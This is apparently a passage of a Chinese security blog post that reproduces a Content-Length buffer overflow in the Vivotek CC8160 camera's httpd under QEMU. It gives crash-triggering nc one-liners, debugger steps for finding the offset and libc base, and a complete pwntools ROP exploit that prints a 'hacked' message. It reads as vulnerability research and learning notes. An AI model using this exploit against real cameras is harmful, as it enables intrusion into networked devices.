+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n&quot;</span>  | nc -v 127.0.0.1 8080</span><br></pre></td></tr></table></figure>
+
+<p>启动另一个终端去发送：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/022.png"></p>
+<p>看一眼报错信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">req-&gt;iCount++= 1</span><br><span class="line">[25/Sep/2026:10:14:28 +0000] caught SIGSEGV, dumping core <span class="keyword">in</span> /tmp</span><br><span class="line">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure>
+
+<p>意思是触发了段错误，这样就意味着我们触发了当前的漏洞</p>
+<p>我们确实触发了溢出，但是接下来我们想要拿到本题目的 shell，我们就需要去编写 exp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chroot</span> ./ ./qemu-arm-static -g 1234 ./usr/sbin/httpd -d</span><br></pre></td></tr></table></figure>
+
+<p>这里一定要加上-d，否则程序会直接挂掉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/023.png"></p>
+<p>这里提一点：在 ARM 上，跳转目标地址的最低位（bit0）不是地址的一部分，而是”指令集选择器”：</p>
+<p>当最低位是 1，目标是 Thumb 代码，当最低位是 0，目标是 ARM 代码。那么怎么判断最低位到底是什么呢？</p>
+<p> ARM 的状态寄存器 CPSR 里有一位专门表示当前指令集：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p/t <span class="variable">$CPSR</span></span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/024.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/025.png"></p>
+<p>涉及到 ARM 模式(LSB&#x3D;0)和 Thumb 模式(LSB&#x3D;1)的切换：栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。在 pwndbg 当中执行 p&#x2F;t $cpsr 以二进制格式显示 CPSR 寄存器，发现 T 位值为 1，因此需要在之前的报错地址上手动加一还原</p>
+<p>因此我们 cyclic -l 的地址其实是 0x61616e61，测出来对应偏移是 51</p>
+<h4 id="接下来就该编写-exp-了"><a href="#接下来就该编写-exp-了" class="headerlink" title="接下来就该编写 exp 了"></a>接下来就该编写 exp 了</h4><h5 id="寻找-libc-base："><a href="#寻找-libc-base：" class="headerlink" title="寻找 libc_base："></a>寻找 libc_base：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hfttc@LAPTOP-BGB77OSR ~/Desktop/IOT/CC8160-VVTK-0100d/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root</span><br><span class="line">$ file ./usr/sbin/httpd</span><br><span class="line">./usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line">hfttc@LAPTOP-BGB77OSR ~/Desktop/IOT/CC8160-VVTK-0100d/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/lib</span><br><span class="line">$ readelf -s libuClibc-0.9.33.3-git.so | grep <span class="string">&#x27; puts&#x27;</span></span><br><span class="line">    45: 00028284   476 FUNC    GLOBAL DEFAULT    7 putspent</span><br><span class="line">   246: 00029538   332 FUNC    GLOBAL DEFAULT    7 puts</span><br></pre></td></tr></table></figure>
+
+<p>找到了 puts 的偏移，去动调找 puts 的实际地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; file ./usr/sbin/httpd</span><br></pre></td></tr></table></figure>
+
+<p>这里记得加载 ELF，否则 pwndbg 不会识别符号：报错和解决如下：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/026.png"></p>
+<p>然后作差去拿到 libc 基址：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/027.png"></p>
+<p>之后先在 0x13538 处下断点，这个时候正好下一步就是 strncpy，</p>
+<p>发送：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env -i /usr/sbin/chroot ./ ./qemu-arm-static -g <span class="number">1234</span> ./usr/sbin/httpd -d</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf <span class="string">&#x27;POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\r\nContent-Length: AAAA\r\n\r\n&#x27;</span> | nc -q1 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8000</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时 SP 寄存器的值为 <code>0x407ffc00</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/028.png"></p>
+<p>之后我们都是往这个栈里面 strncpy，我们的 payload 都是往栈里面写的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msg    = os.environ.get(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;hacked sucessfully!!!&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">51</span>                    </span><br><span class="line">payload += p32(pop_r0) + p32(stack)     <span class="comment"># r0 = 消息地址</span></span><br><span class="line">payload += p32(pop_r1) + p32(stderr)    <span class="comment"># r1 = stderr</span></span><br><span class="line">payload += p32(fputs)                   <span class="comment"># fputs(r0, r1)</span></span><br><span class="line">payload += msg</span><br></pre></td></tr></table></figure>
+
+<p>我们这里利用 fputs 执行任意代码执行漏洞，把 r0 作为 fputs 的第一个参数，传入 stack 地址，stack 地址正好就是我们 payload 填充：<code>SP + 0x51 + 1 + 4*5 = 0x407ffc60</code></p>
+<p>这里解释<code>&#39;+1&#39;</code>：由于 <code>content-length:</code>后面通常是有一个空格的，但是根据上面的逻辑，strncpy 复制的时候直接是从<code>&#39;:&#39;</code>到<code>&#39;\n&#39;</code>，因此这个空格也被包含在内，因此写入的 r0 地址实际是<code>0x407ffc60</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line"></span><br><span class="line">libc   = <span class="number">0x3ff25000</span></span><br><span class="line">stack  = <span class="number">0x407ffc60</span>               </span><br><span class="line">pop_r0 = libc + <span class="number">0x485d8</span>                 <span class="comment"># pop &#123;r0, pc&#125;   -&gt; 一个值直接进第一个参数</span></span><br><span class="line">pop_r1 = libc + <span class="number">0x48784</span>                 <span class="comment"># pop &#123;r1, pc&#125;   -&gt; 一个值直接进第二个参数</span></span><br><span class="line">fputs  = libc + <span class="number">0x317ac</span></span><br><span class="line">stderr = <span class="number">0x3ff79118</span>                     <span class="comment"># uClibc 的 stderr FILE*（fd2，不缓冲）</span></span><br><span class="line">msg    = os.environ.get(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;hacked successfully!!!&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">51</span>                    <span class="comment"># 保存的 PC 在 payload[52]（Content-Length: 冒号后不加空格）</span></span><br><span class="line">payload += p32(pop_r0) + p32(stack)     <span class="comment"># r0 = 消息地址</span></span><br><span class="line">payload += p32(pop_r1) + p32(stderr)    <span class="comment"># r1 = stderr</span></span><br><span class="line">payload += p32(fputs)                   <span class="comment"># fputs(r0, r1)</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># assert b&#x27;\x00&#x27; not in payload         # 载荷里不能有 NUL，否则 strncpy 会把栈写穿、ROP 跑不到</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8000</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\r\nContent-Length: &#x27;</span> + payload + <span class="string">b&#x27;\n\r\n&#x27;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试一下，就能够执行任意代码执行漏洞：<code>hacked accessfully!!!</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/HFTTC.github.io/images/iot/vivotek-cc8160-content-length/029.png"></p>
+<p>至于为什么不拿 shell，按理来说是可以的，打一个 ret2libc，但是好像是必须需要 system 模拟才可以</p>
+<p>还是不太理解，下一次拿 system 模拟一次看看能不能拿到 shell。</p>
+
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/HFTTC.github.io/categories/Notes/" title="Notes" data-aos="zoom-in">Notes</a>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+        <img data-src="/HFTTC.github.io/images/web/covers/mysql-injection.jpg" data-sizes="auto" alt="简单的 MySQL 注入" class="lazyload">
+      <a href="/HFTTC.github.io/2026/09/26/%E7%AE%80%E5%8D%95%E7%9A%84MySQL%E6%B3%A8%E5%85%A5/" aria-label="后一篇: 简单的 MySQL 注入"  title="后一篇: 简单的 MySQL 注入"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          简单的 MySQL 注入
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      HFTTC
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        288.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        23:50
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99-POC-%E6%B5%8B%E5%81%8F%E7%A7%BB%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">编写 POC 测偏移：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E8%AF%A5%E7%BC%96%E5%86%99-exp-%E4%BA%86"><span class="toc-number">4.</span> <span class="toc-text">接下来就该编写 exp 了</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE-libc-base%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">寻找 libc_base：</span></a></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">151</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/notice" aria-label="公告"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">公告</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="/HFTTC.github.io/js/lazyload-local.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "Vivotek 摄像头 HTTP 缓冲区溢出漏洞",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/09/29/Vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%20HTTP%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: "Vivotek CC8160 是一款网络摄像机，在 VVTK-0113b 版本之前的固件中存在一个缓冲区溢出漏洞。 可以在这里下载固件：CC8160-VVTK-0100d.flash.zip   下载之后解压拿到 CC8160-VVTK-0100d.flash.pkg 附件，然后利用 binwalk 提取固件： 1binwalk -Me CC8160-VVTK-0100d.flash.pkg  解压后有四个.extracted看一看内容：   进入找到 squashfs-root：   可以现在",
+          date: "Tue Sep 29 2026 15:45:00 GMT+0800",
+          updated: "Tue Sep 29 2026 15:44:51 GMT+0800",
+          cover: "/HFTTC.github.io/images/iot/covers/vivotek-cc8160-content-length.jpg",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
